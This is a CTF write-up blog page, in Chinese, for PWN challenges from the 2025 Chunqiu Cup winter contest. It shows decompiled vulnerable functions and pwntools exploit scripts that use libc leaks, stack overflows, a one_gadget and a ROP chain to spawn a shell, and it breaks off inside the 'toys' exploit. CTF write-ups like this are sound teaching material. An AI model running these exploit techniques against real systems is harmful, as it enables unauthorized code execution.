<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="viol1t">





<title>2025年春秋杯冬季赛wp | viol1t</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">viol1t</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">viol1t</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/achievement">Achievement</a>
                
                    <a class="menu-item" href="/members">Members</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">2025年春秋杯冬季赛wp</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">viol1t</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">一月 24, 2025&nbsp;&nbsp;16:59:24</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/WP/">WP</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p>题目下载地址：<a target="_blank" rel="noopener" href="https://github.com/0xviol1t/CTF-challenges/tree/main/2025/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B">https://github.com/0xviol1t/CTF-challenges/tree/main/2025/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B</a></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h3><p>main 函数中输入格式不正确的时候会输出 puts 函数地址，泄露 libc 地址，输入长度为 4 内容为 \x00 的时候会进入 compare 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  *(_QWORD *)s = &amp;<span class="built_in">puts</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64 *, <span class="type">char</span> **, <span class="type">char</span> *))init_0)(&amp;v6, a2, buf);</span><br><span class="line">  fd = open(<span class="string">&quot;.BYPASS&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(fd, buf, <span class="number">0x1000</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      close(fd);</span><br><span class="line">      <span class="keyword">if</span> ( buf[<span class="built_in">strlen</span>(buf) - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        buf[<span class="built_in">strlen</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      v8 = <span class="built_in">strchr</span>(buf, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v8 - buf) &lt;= <span class="number">0x3F</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v8 + <span class="number">1</span>) &lt;= <span class="number">0x3F</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *v8 = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">strcpy</span>(dest, buf);</span><br><span class="line">            <span class="built_in">strcpy</span>(byte_602140, v8 + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;v7, <span class="number">4uLL</span>) != <span class="number">4</span> )</span><br><span class="line">                  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v7 )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                compare();</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v7 == <span class="number">1</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              <span class="built_in">puts</span>(<span class="string">&quot;Invalid&quot;</span>);</span><br><span class="line">              <span class="built_in">puts</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点在 compare 函数中，两次 read 都是向 buf 读取并且长度都是 0x200，第一次读取会复制到 KEY 中，第二次读取会复制到 VAL 中，而离 rbp 最近的 VAL 距离也超过 0x200，但是从 buf 复制的过程是遇 \x00 停止，所以可以从 buf 一直复制到 KEY，加起来就超过 0x200 了，但是在覆盖到 ret 的过程中还需要注意 rbp-2h 是复制的 index，要合理控制这个 i 让复制过程正确进行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">512</span>]; <span class="comment">// [rsp+0h] [rbp-610h] BYREF</span></span><br><span class="line">  <span class="type">char</span> KEY[<span class="number">512</span>]; <span class="comment">// [rsp+200h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">char</span> VAL[<span class="number">526</span>]; <span class="comment">// [rsp+400h] [rbp-210h] BYREF</span></span><br><span class="line">  __int16 i; <span class="comment">// [rsp+60Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(VAL, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(KEY, <span class="number">0</span>, <span class="keyword">sizeof</span>(KEY));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v0 = read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">strncmp</span>(buf, <span class="string">&quot;KEY: &quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(_DWORD)v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">5</span>; buf[i]; ++i )</span><br><span class="line">        KEY[i - <span class="number">5</span>] = buf[i];</span><br><span class="line">      KEY[i - <span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">      v0 = read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">strncmp</span>(buf, <span class="string">&quot;VAL: &quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !(_DWORD)v0 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">5</span>; buf[i]; ++i )</span><br><span class="line">            VAL[i - <span class="number">5</span>] = buf[i];</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;39.106.48.123&#x27;</span>, <span class="number">44314</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = get_libc()</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc/libc-2.27.so&#x27;</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;KEY: &#x27;</span> + <span class="string">b&#x27;c&#x27;</span> * <span class="number">19</span> + <span class="string">b&#x27;\x13\x02&#x27;</span> + <span class="string">b&#x27;aaaaaaaa&#x27;</span> + p64(<span class="number">0x4f302</span> + libc_base)</span><br><span class="line">p = p.ljust(<span class="number">0x200</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.send(p)</span><br><span class="line">r.send(<span class="string">b&#x27;VAL: &#x27;</span> + <span class="string">b&#x27;b&#x27;</span> * (<span class="number">0x200</span> - <span class="number">0x5</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="gender-simulation"><a href="#gender-simulation" class="headerlink" title="gender_simulation"></a>gender_simulation</h3><p>菜单里就给了 libc 地址，这题直接测试发现在输入 2 2 之后再输入可以直接劫持程序流，有个后门是性别为购物袋，存在栈溢出漏洞，直接溢出写 rop 链执行 system(‘&#x2F;bin&#x2F;sh’)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">gender</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _BYTE buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">         &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">         <span class="string">&quot;If you think you are a shopping bag, please leave your gender certificate&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;47.94.84.92&#x27;</span>, <span class="number">30857</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040201a</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000010f75b</span> + libc_base</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;certificate&#x27;</span>, p64(<span class="number">0x4025E6</span>))</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;certificate&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="riya"><a href="#riya" class="headerlink" title="riya"></a>riya</h3><p>输入 n 直接跳到 LABEL_10 送 shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;y/n&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v3, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">LABEL_10:</span><br><span class="line">      setuid(<span class="number">0x3E8</span>u);</span><br><span class="line">      backdoor();</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="toys"><a href="#toys" class="headerlink" title="toys"></a>toys</h3><p>这题只有一个栈溢出，还没什么 gadgets</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There are no toys here!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">0x1337</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &gt; <span class="number">0x80</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Too many!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路：</p>
<ul>
<li>由于缺少 pop_rdi_ret 等 gadgets，而且程序中的 puts 输出的都是 rodata 段的数据，而 strlen_len 的参数是 rbp - 0x80，所以需要改 strlen_got 为 puts_plt 去泄露在 rbp - 0x80提前布置好的 libc 地址</li>
<li>修改 strlen_got 的方法是利用 fgets 向 rbp - 0x80 的位置写，修改 rbp 为 strlen_got + 0x80 再用 fgets 输入就能覆盖 strlen_got 为 puts_plt</li>
<li>直接把栈迁移到 got 表那块会覆盖到其他有用的地址，所以需要迁移到程序段高地址去写 rop 链，其中一次输入在 strlen_got + 0x80</li>
</ul>
<p>exp分析：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span 